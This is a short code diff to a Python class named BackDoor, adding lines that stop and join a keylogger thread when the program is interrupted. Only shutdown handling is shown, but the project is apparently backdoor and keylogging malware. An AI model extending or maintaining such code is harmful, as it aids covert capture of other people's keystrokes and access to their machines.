@@ -162,6 +162,8 @@ class BackDoor:
         except KeyboardInterrupt as e:
             observer.stop()
             observer.join()
+            keylog_t.stop()
+            keylog_t.join()
             sys.exit(" Closed")
         except FileNotFoundError as e:
             sys.exit(" Closed")
